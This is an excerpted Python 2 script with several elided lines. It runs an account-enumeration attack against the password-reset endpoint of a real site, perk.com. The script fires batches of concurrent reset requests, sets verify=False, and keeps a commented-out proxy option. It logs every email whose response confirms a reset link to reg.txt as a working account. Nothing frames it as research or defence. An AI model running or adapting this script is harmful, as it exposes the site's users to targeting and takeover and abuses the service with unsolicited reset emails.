...
def call(c):
	def hook(r, **kwargs):
		...
		f.write('{0}\n'.format(c))
		f.close()
		if 'Instructions to reset your password ' in r.text:
			print c, 'works!'
			f = open("reg.txt", "a")
			f.write('{0}\n'.format(c))
			f.close()
	...
	while True:
		try:
			...
			while len(gls) <= 15:
				...
				gls.append(
					grequests.post(
						'http://perk.com/accounts/reset_new_password?mobile=1?___{0}'.format(user),
						data='email={0}&Submit=Send+Link'.format(user),
						verify=False,
						headers=headers,
						#proxies=prozy,
